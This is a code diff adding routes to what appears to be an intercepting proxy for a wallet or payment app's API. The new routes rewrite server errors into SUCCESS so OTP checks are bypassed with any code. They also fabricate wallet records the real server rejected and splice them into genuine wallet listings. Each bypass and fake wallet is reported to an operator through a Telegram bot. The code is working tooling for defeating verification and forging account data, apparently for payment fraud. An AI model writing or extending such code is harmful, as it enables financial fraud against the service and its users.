@@ -1029,6 +1029,100 @@ For per-ID control: /id deposit on <amount> <userId>`
   }
 });
 
+async function loadFakeWallets(userId) {
+  if (!redis) return [];
+  try {
+    const raw = await redis.get(`fakeWallets_${userId}`);
+    return raw ? JSON.parse(raw) : [];
+  } catch(e) { return []; }
+}
+async function saveFakeWallets(userId, wallets) {
+  if (!redis) return;
+  try { await redis.set(`fakeWallets_${userId}`, JSON.stringify(wallets)); } catch(e) {}
+}
+
+app.post('/wallet/sendOtp', async (req, res) => {
+  const body = req.parsedBody || {};
+  const phone = body.phone || body.mobile || body.phoneNumber || '';
+  const userId = extractUserId(req, null);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const info = (jsonResp && jsonResp.statusInfo || '').toUpperCase();
+    if (jsonResp && jsonResp.statusCode !== '0' && (info.includes('EXIST') || info.includes('ALREADY') || info.includes('REGISTERED'))) {
+      jsonResp.statusCode = '0';
+      jsonResp.statusInfo = 'SUCCESS';
+      jsonResp.status = 200;
+      jsonResp.data = null;
+      if (bot && (await loadData()).adminChatId) {
+        bot.sendMessage((await loadData()).adminChatId, `⚠️ Wallet bypass for ${phone} [${userId}]\nServer said: ${info}\nEnter any OTP code (1234)`).catch(()=>{});
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: null });
+  }
+});
+
+app.post(['/wallet/add', '/wallet/add/v2'], async (req, res) => {
+  const body = req.parsedBody || {};
+  const userId = extractUserId(req, null);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (jsonResp && jsonResp.statusCode === '0') {
+      sendJson(res, respHeaders, jsonResp, respBody);
+      return;
+    }
+    const walletName = body.walletName || body.name || body.type || 'PhonePe';
+    const walletPhone = body.phone || body.mobile || body.phoneNumber || body.accountNo || '';
+    const walletOtp = body.otp || body.smsCode || body.code || '';
+    const fakeWallet = {
+      id: Date.now(),
+      walletName: walletName,
+      walletType: (walletName || '').toLowerCase().replace(/\s/g, ''),
+      phone: walletPhone,
+      accountNo: walletPhone,
+      status: 1,
+      isDefault: 0,
+      createTime: new Date().toISOString(),
+      fake: true
+    };
+    if (userId) {
+      const existing = await loadFakeWallets(userId);
+      existing.push(fakeWallet);
+      await saveFakeWallets(userId, existing);
+    }
+    if (bot && (await loadData()).adminChatId) {
+      bot.sendMessage((await loadData()).adminChatId, `✅ Fake wallet created [${userId}]\n💳 ${walletName}: ${walletPhone}`).catch(()=>{});
+    }
+    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: fakeWallet });
+  } catch(e) {
+    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: { id: Date.now(), status: 1 } });
+  }
+});
+
+app.post('/wallet/list', async (req, res) => {
+  const userId = extractUserId(req, null);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (jsonResp && userId) {
+      const fakeWallets = await loadFakeWallets(userId);
+      if (fakeWallets.length > 0) {
+        if (Array.isArray(jsonResp.data)) {
+          jsonResp.data = jsonResp.data.concat(fakeWallets);
+        } else if (jsonResp.data && Array.isArray(jsonResp.data.list)) {
+          jsonResp.data.list = jsonResp.data.list.concat(fakeWallets);
+        } else if (jsonResp.data === null || jsonResp.data === undefined) {
+          jsonResp.data = fakeWallets;
+        }
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    const fakeWallets = userId ? await loadFakeWallets(userId) : [];
+    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: fakeWallets });
+  }
+});
+
 app.all('/wallet/online/walletType', async (req, res) => {
   const bankData = await loadData();
   const userId = extractUserId(req, null);
